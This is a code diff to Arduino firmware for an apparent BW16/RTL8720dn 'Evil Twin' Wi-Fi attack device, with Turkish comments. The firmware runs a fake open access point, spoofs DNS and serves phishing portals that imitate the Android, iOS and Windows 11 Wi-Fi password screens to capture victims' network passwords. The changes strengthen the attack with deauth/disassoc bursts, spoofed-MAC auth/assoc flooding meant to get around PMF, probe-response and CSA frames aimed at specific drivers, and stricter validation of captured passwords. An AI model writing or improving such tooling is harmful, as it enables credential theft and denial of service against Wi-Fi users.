@@ -32,6 +32,7 @@ static bool          et_dns_started    = false;
 static unsigned long et_last_deauth_ms = 0;
 static unsigned long et_last_retrack_ms= 0;
 static uint8_t       et_broadcast[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+static uint32_t      et_flood_mac_ctr  = 0x22334455; // Flood MAC counter for ET burst
 
 // Retrack tarama sonucu
 static volatile bool    et_rt_found   = false;
@@ -43,14 +44,14 @@ static uint8_t          et_rt_bssid[6] = {0};
 // ARAŞTIRMA BULGUSU — Evil-BW16-WebUI, Ameba IoT forum, BW16-ESP32-Evil-Twin:
 //
 // AmebaD SDK'sı, WiFi.apbegin() öncesi STA arayüzünün TAMAMEN kapatılmasını
-// zorunlu kılar. WiFi.disableSTA() çağrılmadan apbegin() çağrılırsa:
+// zorunlu kılar. WiFi.disconnect() çağrılmadan apbegin() çağrılırsa:
 //   - AP sessizce başarısız olur VEYA başlar ama beacon göndermez
 //   - Kurbanın tarama listesinde ağ görünmez
 //   - Bu, "deauth çalışıyor ama sahte AP görünmüyor" hatasının #1 sebebidir.
 //
 // Referanslar:
 //   - Evil-BW16-WebUI (Evil-Project-Team/Evil-BW16-WebUI) startEvilTwin()
-//   - Ameba IoT forum: "WiFi.disableSTA() before apbegin()"
+//   - Ameba IoT forum: "WiFi.disconnect() before apbegin()"
 //   - BW16-ESP32-Evil-Twin (Janek79ax) setup sequence
 //
 // Kanal:  AmebaD SDK imzası: WiFi.apbegin(ssid, password, channel_str)
@@ -68,13 +69,19 @@ static void et_ap_start(const String &ap_ssid, int channel) {
   snprintf(c, sizeof(c), "%d", ch);
 
   // ── ADIM 1: STA arayüzünü tamamen kapat ──────────────────────────────────
-  // Bu olmadan apbegin() beacon göndermez.
+  // WiFi.disconnect() bağlantıyı keser; apbegin() mod geçişini kendisi halleder.
+  // Not: disableSTA() bazı AmebaD core sürümlerinde yoktur; disconnect() yeterlidir.
   WiFi.disconnect();
-  WiFi.disableSTA();
   delay(300); // Radio settle — atlamak AP'nin başlamamasına yol açar
 
   // ── ADIM 2: Sahte AP'yi başlat (açık ağ, şifresiz) ───────────────────────
   WiFi.apbegin(s, (char *)"", c);
+
+  // ── ADIM 3: WLAN0 güç tasarrufunu kapat ──────────────────────────────────
+  // AmebaD her WiFi.apbegin() çağrısında power-save'i yeniden etkinleştirir.
+  // Bu, WLAN0'ın uyku moduna girmesine ve raw frame injection'ın durmasına yol açar.
+  // Her AP yeniden başlatmasından sonra bu çağrı zorunludur.
+  wifi_disable_powersave();
 }
 
 // ─── DNS Spoofer ──────────────────────────────────────────────────────────────
@@ -120,9 +127,13 @@ static void et_dns_process_packet() {
   resp[pos++] = 0x00; resp[pos++] = 0x00;
   resp[pos++] = 0x00; resp[pos++] = 0x3C;
   resp[pos++] = 0x00; resp[pos++] = 0x04;  // RDLENGTH = 4
-  // RDATA: 192.168.1.1
-  resp[pos++] = 192; resp[pos++] = 168;
-  resp[pos++] = 1;   resp[pos++] = 1;
+  // RDATA: ET_AP_IP_STR parsed to octets — kept in sync with the macro
+  {
+    int o0 = 0, o1 = 0, o2 = 0, o3 = 0;
+    sscanf(ET_AP_IP_STR, "%d.%d.%d.%d", &o0, &o1, &o2, &o3);
+    resp[pos++] = (uint8_t)o0; resp[pos++] = (uint8_t)o1;
+    resp[pos++] = (uint8_t)o2; resp[pos++] = (uint8_t)o3;
+  }
 
   et_dns_udp.beginPacket(sender_ip, sender_port);
   et_dns_udp.write(resp, pos);
@@ -161,10 +172,21 @@ static void et_send_redirect(WiFiClient &client, const char *url) {
   client.write(r.c_str());
 }
 
-// Android için 204 No Content yanıtı (captive portal algılama bazı sürümlerde
-// bu yanıtı bekler; yanlış yanıt → portal açılmaz)
-static void et_send_204(WiFiClient &client) {
-  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+// ─── HTML SSID escape ─────────────────────────────────────────────────────────
+// Prevents layout breakage / injection when SSID contains <, >, &, " chars.
+String et_html_escape(const String &s) {
+  String out;
+  out.reserve(s.length() + 8);
+  for (int i = 0; i < (int)s.length(); i++) {
+    char c = s[i];
+    if      (c == '<')  out += F("&lt;");
+    else if (c == '>')  out += F("&gt;");
+    else if (c == '&')  out += F("&amp;");
+    else if (c == '"')  out += F("&quot;");
+    else if (c == '\'') out += F("&#39;");
+    else                out += c;
+  }
+  return out;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -173,13 +195,14 @@ static void et_send_204(WiFiClient &client) {
 
 // ─── Android — Material Design 3 ─────────────────────────────────────────────
 static void portal_android(WiFiClient &client, bool wrong_pass) {
+  String ssid_safe = et_html_escape(evil_twin_ssid);
   String html;
   html.reserve(6000);
   html = F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
     "<title>");
-  html += evil_twin_ssid;
+  html += ssid_safe;
   html += F("</title><style>"
     ":root{"
       "--bg:#1C1B1F;--surf:#2B2930;--surf2:#38343C;"
@@ -242,7 +265,7 @@ static void portal_android(WiFiClient &client, bool wrong_pass) {
       "</svg>"
     "</button></div>"
     "<h1>");
-  html += evil_twin_ssid;
+  html += ssid_safe;
   html += F("</h1>"
     "<p style='font-size:13px;color:var(--hint);text-align:center;margin:0 0 14px'>"
       "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
@@ -250,7 +273,8 @@ static void portal_android(WiFiClient &client, bool wrong_pass) {
     "<form method='post' action='/portal/submit' id='f'>"
     "<div class='field'>"
       "<input class='finput' type='password' name='password' id='pw'"
-        " placeholder=' ' autocomplete='off'>"
+        " placeholder=' ' autocomplete='off'"
+        " oninput='document.getElementById(\"submitbtn\").disabled=this.value.length<8'>"
       "<label class='flabel' for='pw'>&#350;ifre*</label>"
       "<button type='button' class='eye' onclick='togglePw()'>"
         "<svg width='22' height='22' viewBox='0 0 24 24' fill='currentColor'>"
@@ -269,7 +293,7 @@ static void portal_android(WiFiClient &client, bool wrong_pass) {
   html += F(
     "<div class='btns'>"
       "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
-      "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
+      "<button type='submit' class='bconnect' id='submitbtn' disabled>Ba&#287;lan</button>"
     "</div>"
     "</form>"
     "<div class='wps-hint'>"
@@ -297,6 +321,7 @@ static void portal_android(WiFiClient &client, bool wrong_pass) {
 
 // ─── iOS — Apple native WiFi parola ekranı ────────────────────────────────────
 static void portal_ios(WiFiClient &client, bool wrong_pass) {
+  String ssid_safe = et_html_escape(evil_twin_ssid);
   String html;
   html.reserve(6000);
   html = F("<!DOCTYPE html><html><head>"
@@ -362,7 +387,7 @@ static void portal_ios(WiFiClient &client, bool wrong_pass) {
     "<div class='content'>"
       "<div class='wifi-ico'>&#128225;</div>"
       "<div class='ssid-lbl'>");
-  html += evil_twin_ssid;
+  html += ssid_safe;
   html += F("</div>"
       "<div class='sub'>"
         "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
@@ -385,7 +410,7 @@ static void portal_ios(WiFiClient &client, bool wrong_pass) {
           "<span class='cell-lbl'>Parola</span>"
           "<input class='cell-input' type='password' name='password' id='pw'"
             " placeholder='Gerekli' autocomplete='off'"
-            " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<1'>"
+            " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<8'>"
           "<button type='button' class='eye-ios' onclick='togglePw()'>"
             "<svg width='22' height='16' viewBox='0 0 24 18' fill='currentColor'>"
               "<path d='M12 3C7 3 2.73 6.11 1 10c1.73 3.89 6 7 11 7s9.27-3.11 11-7"
@@ -421,13 +446,14 @@ static void portal_ios(WiFiClient &client, bool wrong_pass) {
 
 // ─── Windows 11 WiFi flyout ───────────────────────────────────────────────────
 static void portal_windows(WiFiClient &client, bool wrong_pass) {
+  String ssid_safe = et_html_escape(evil_twin_ssid);
   String html;
   html.reserve(7000);
   html = F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
     "<title>Ba&#287;lan: ");
-  html += evil_twin_ssid;
+  html += ssid_safe;
   html += F("</title><style>"
     ":root{"
       "--bg:#F3F3F3;--card:#FFFFFF;--text:#1A1A1A;--text2:#5D5D5D;"
@@ -505,7 +531,7 @@ static void portal_windows(WiFiClient &client, bool wrong_pass) {
         "<div class='wifi-ico'>&#128225;</div>"
         "<div>"
           "<div class='ssid-txt'>");
-  html += evil_twin_ssid;
+  html += ssid_safe;
   html += F("</div>"
           "<div class='ssid-sub'>Kilitli &bull; Kablosuz A&#287; G&#252;venlik Anahtar&#305; Gerekli</div>"
         "</div>"
@@ -543,7 +569,7 @@ static void portal_windows(WiFiClient &client, bool wrong_pass) {
       "</div>"
       "<p class='hint-sm'>Parola en az 8 karakter olmal&#305;d&#305;r.</p>"
       "<div class='chk-row'>"
-        "<input type='checkbox' id='auto' checked>"
+        "<input type='checkbox' id='auto' checked onchange='togglePw()'>"
         "<label for='auto'>Karakterleri gizle</label>"
       "</div>"
       "<div class='btn-row'>"
@@ -730,7 +756,11 @@ static rtw_result_t et_retrack_handler(rtw_scan_handler_result_t *scan_result) {
     memcpy(et_rt_bssid, bssid, 6);
     return RTW_SUCCESS;
   }
-  r->SSID.val[r->SSID.len] = '\0';
+  if (r->SSID.len < sizeof(r->SSID.val)) {
+    r->SSID.val[r->SSID.len] = '\0';
+  } else {
+    r->SSID.val[sizeof(r->SSID.val) - 1] = '\0';
+  }
   String found_ssid = String((const char *)r->SSID.val);
   if (!et_rt_found && found_ssid == evil_twin_ssid) {
     et_rt_found   = true;
@@ -749,16 +779,15 @@ static void et_retrack() {
   //   → Scan fonksiyonu SoftAP aktifken RTW_ERROR döndürebilir.
   //
   // Çözüm: AP durdur → tara → AP yeniden başlat.
-  // et_ap_start() zaten WiFi.disconnect() + WiFi.disableSTA() yapar.
+  // et_ap_start() zaten WiFi.disconnect() + delay yapar.
   //
   // Referans: forum.amebaiot.com, RTL8720dn-5GHz-Wifi-Deauther, Evil-BW16.
 
   // 1. DNS durdur
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
 
-  // 2. Radyoyu serbest bırak (et_ap_start içindeki disconnect/disableSTA ile aynı)
+  // 2. Radyoyu serbest bırak
   WiFi.disconnect();
-  WiFi.disableSTA();
   delay(200);
 
   // 3. Tara — radyo artık serbest, AP yok, scan çalışabilir
@@ -777,7 +806,7 @@ static void et_retrack() {
     if (bssid_changed)   memcpy(evil_twin_bssid, et_rt_bssid, 6);
   }
 
-  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+disableSTA+apbegin)
+  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+delay+apbegin)
   et_ap_start(evil_twin_ssid, evil_twin_channel);
   delay(500);
 
@@ -787,6 +816,19 @@ static void et_retrack() {
 
   // 7. Kanal değiştiyse hemen deauth burst gönder
   if (channel_changed || bssid_changed) et_last_deauth_ms = 0;
+}
+
+// ─── ET burst için flood MAC üretici ─────────────────────────────────────────
+// Ana saldırıdaki nextFloodMAC() ile aynı mantık; locally administered bit (0x02).
+// Ayrı sayaç (et_flood_mac_ctr) kullanılır — .ino bağlamından bağımsızdır.
+static void et_next_flood_mac(uint8_t *mac) {
+  et_flood_mac_ctr++;
+  mac[0] = 0x02; // locally administered, unicast
+  mac[1] = 0xBB;
+  mac[2] = (et_flood_mac_ctr >> 24) & 0xFF;
+  mac[3] = (et_flood_mac_ctr >> 16) & 0xFF;
+  mac[4] = (et_flood_mac_ctr >>  8) & 0xFF;
+  mac[5] =  et_flood_mac_ctr        & 0xFF;
 }
 
 // ─── Deauth burst ─────────────────────────────────────────────────────────────
@@ -805,21 +847,46 @@ static void et_retrack() {
 //   - forum.amebaiot.com/t/rtl8720dn-is-802-11-frame-injection-possible/883
 //   - tesa-klebeband.github.io/making-raw-802-11-frame-injection-possible-on-an-rtl8720dn
 static void et_send_deauth_burst() {
-  static const uint8_t reasons[] = {2, 3, 6, 7, 8};
+  // Deauth: reason {2,3,4,6,8} — tüm platformlara karşı etkili
+  // Disassoc: reason {2,3,8} — spec ve attackBand() ile tutarlı (4 ve 6 disassoc için gereksiz)
+  static const uint8_t deauth_reasons[]   = {2, 3, 4, 6, 8};
+  static const uint8_t disassoc_reasons[] = {2, 3, 8};
   const char *ssid_c = evil_twin_ssid.c_str();
+  uint8_t flood_mac[6];
 
   // ── Birincil band (WLAN0 → hedef kanal) ──────────────────────────────────
   // WLAN1'deki AP bundan etkilenmez — bağımsız arayüzler.
   wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel);
-  for (int r = 0; r < 5; r++) {
-    wifi_tx_deauth_frame  (evil_twin_bssid, et_broadcast, reasons[r]);
-    wifi_tx_disassoc_frame(evil_twin_bssid, et_broadcast, reasons[r]);
+
+  // Deauth: reason {2,3,4,6,8}
+  for (int r = 0; r < 5; r++)
+    wifi_tx_deauth_frame(evil_twin_bssid, et_broadcast, deauth_reasons[r]);
+
+  // Disassoc: reason {2,3,8} — tam yeniden bağlanmayı zorlar
+  for (int r = 0; r < 3; r++)
+    wifi_tx_disassoc_frame(evil_twin_bssid, et_broadcast, disassoc_reasons[r]);
+
+  // Auth+Assoc flood — PMF'den muaf, gerçek AP association tablosunu doldurur (Windows PMF ✓)
+  for (int i = 0; i < 5; i++) {
+    et_next_flood_mac(flood_mac);
+    wifi_tx_auth_frame (evil_twin_bssid, flood_mac);
+    wifi_tx_assoc_frame(evil_twin_bssid, flood_mac);
   }
+
+  // Probe Response: caps=0x0001 — Realtek/TP-Link sürücüsünü keser
+  wifi_tx_probe_resp_frame(evil_twin_bssid, ssid_c, (uint8_t)evil_twin_channel);
+
   // Beacon: DS Parameter Set IE ile kanal bilgisi dahil — istemci bağlanmayı dener
-  for (int i = 0; i < 3; i++) {
+  for (int i = 0; i < 3; i++)
     wifi_tx_beacon_frame(evil_twin_bssid, et_broadcast, ssid_c,
                          (uint8_t)evil_twin_channel);
-  }
+
+  // CSA kuyruk: ch14/ch0 dönüşümlü ×5 — Windows + Realtek/TP-Link USB sürücülerini etkiler
+  wifi_tx_csa_frame(evil_twin_bssid, 14);
+  wifi_tx_csa_frame(evil_twin_bssid,  0);
+  wifi_tx_csa_frame(evil_twin_bssid, 14);
+  wifi_tx_csa_frame(evil_twin_bssid,  0);
+  wifi_tx_csa_frame(evil_twin_bssid, 14);
 
   // ── İkinci band (çift bant aktifse, WLAN0 kanal değiştir) ────────────────
   // AP WLAN1'de güvenle devam eder; WLAN0 kanal değişikliği sadece injection'ı etkiler.
@@ -827,15 +894,27 @@ static void et_send_deauth_burst() {
     wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel2);
     const char *ssid_c2 = (evil_twin_ssid2.length() > 0)
                             ? evil_twin_ssid2.c_str() : ssid_c;
-    for (int r = 0; r < 5; r++) {
-      wifi_tx_deauth_frame  (evil_twin_bssid2, et_broadcast, reasons[r]);
-      wifi_tx_disassoc_frame(evil_twin_bssid2, et_broadcast, reasons[r]);
+
+    for (int r = 0; r < 5; r++)
+      wifi_tx_deauth_frame(evil_twin_bssid2, et_broadcast, deauth_reasons[r]);
+    for (int r = 0; r < 3; r++)
+      wifi_tx_disassoc_frame(evil_twin_bssid2, et_broadcast, disassoc_reasons[r]);
+    for (int i = 0; i < 5; i++) {
+      et_next_flood_mac(flood_mac);
+      wifi_tx_auth_frame (evil_twin_bssid2, flood_mac);
+      wifi_tx_assoc_frame(evil_twin_bssid2, flood_mac);
     }
-    for (int i = 0; i < 3; i++) {
+    wifi_tx_probe_resp_frame(evil_twin_bssid2, ssid_c2, (uint8_t)evil_twin_channel2);
+    for (int i = 0; i < 3; i++)
       wifi_tx_beacon_frame(evil_twin_bssid2, et_broadcast, ssid_c2,
                            (uint8_t)evil_twin_channel2);
-    }
-    // Birincil kanala geri dön (DNS ve web sunucusu için gerekli değil ama tutarlılık için)
+    wifi_tx_csa_frame(evil_twin_bssid2, 14);
+    wifi_tx_csa_frame(evil_twin_bssid2,  0);
+    wifi_tx_csa_frame(evil_twin_bssid2, 14);
+    wifi_tx_csa_frame(evil_twin_bssid2,  0);
+    wifi_tx_csa_frame(evil_twin_bssid2, 14);
+
+    // Birincil kanala geri dön
     wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel);
   }
 }
@@ -873,14 +952,15 @@ void stop_evil_twin() {
 
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
 
-  // Yönetim AP'sini yeniden başlat — aynı STA teardown sekansı gerekli.
-  // et_ap_start() zaten WiFi.disconnect() + WiFi.disableSTA() + delay yapar.
-  // Burada doğrudan ssid/pass ile çağırıyoruz.
+  // Yönetim AP'sini yeniden başlat.
   WiFi.disconnect();
-  WiFi.disableSTA();
   delay(300);
   { char c[] = "1"; WiFi.apbegin(ssid, pass, c); }
   delay(500);
+
+  // Yönetim AP yeniden başladıktan sonra power-save'i tekrar kapat.
+  // AmebaD her apbegin() sonrasında power-save'i sıfırlar; WLAN0 injection için aktif kalmalı.
+  wifi_disable_powersave();
 }
 
 // ─── Evil Twin ana döngüsü ────────────────────────────────────────────────────
@@ -953,7 +1033,8 @@ bool evil_twin_portal_handle(WiFiClient &client,
   if (path == "/generate_204"              ||
       path.startsWith("/generate_204?")    ||
       path == "/gen_204"                   ||
-      path.startsWith("/gen_204?")) {
+      path.startsWith("/gen_204?")         ||
+      path == "/check_network_status") {
     redir_portal();
     return true;
   }
@@ -985,7 +1066,8 @@ bool evil_twin_portal_handle(WiFiClient &client,
   // ── POST /portal/submit — şifre alma ─────────────────────────────────────
   if (path == "/portal/submit") {
     String password = et_extract_password(request);
-    if (password.length() < 1) {
+    // WPA2 minimum password is 8 characters; shorter inputs are invalid
+    if (password.length() < 8) {
       et_send_redirect(client, "http://" ET_AP_IP_STR "/portal");
       return true;
     }
